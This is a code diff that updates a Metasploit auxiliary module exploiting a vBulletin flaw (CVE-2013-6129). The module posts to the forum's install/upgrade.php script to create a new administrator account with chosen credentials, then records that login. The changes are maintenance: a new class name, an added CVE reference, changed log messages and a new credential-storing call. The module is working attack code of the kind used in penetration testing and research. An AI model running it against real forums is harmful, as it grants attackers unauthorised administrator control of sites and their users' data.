@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -26,6 +23,7 @@ class Metasploit3 < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'References'     =>
         [
+          [ 'CVE', '2013-6129' ],
           [ 'URL', 'http://blog.imperva.com/2013/10/threat-advisory-a-vbulletin-exploit-administrator-injection.html'],
           [ 'OSVDB', '98370' ],
           [ 'URL', 'http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/3991423-potential-vbulletin-exploit-vbulletin-4-1-vbulletin-5']
@@ -38,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),
         OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password']),
         OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
-      ], self.class)
+      ])
   end
 
   def user
@@ -52,11 +50,11 @@ class Metasploit3 < Msf::Auxiliary
   def run
 
     if user == pass
-      print_error("#{peer} - Please select a password different than the username")
+      print_error("Please select a password different than the username")
       return
     end
 
-    print_status("#{peer} - Trying a new admin vBulletin account...")
+    print_status("Trying a new admin vBulletin account...")
 
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, "install", "upgrade.php"),
@@ -83,18 +81,18 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body =~ /Administrator account created/
-      print_good("#{peer} - Admin account with credentials #{user}:#{pass} successfully created")
-      report_auth_info(
-        :host => rhost,
-        :port => rport,
-        :sname => 'http',
-        :user => user,
-        :pass => pass,
-        :active => true,
-        :proof  => res.body
-      )
+      print_good("Admin account with credentials #{user}:#{pass} successfully created")
+      connection_details = {
+          module_fullname: self.fullname,
+          username: user,
+          private_data: pass,
+          private_type: :password,
+          status: Metasploit::Model::Login::Status::UNTRIED,
+          proof: res.body
+      }.merge(service_details)
+      create_credential_and_login(connection_details)
     else
-      print_error("#{peer} - Admin account creation failed")
+      print_error("Admin account creation failed")
     end
   end
 end
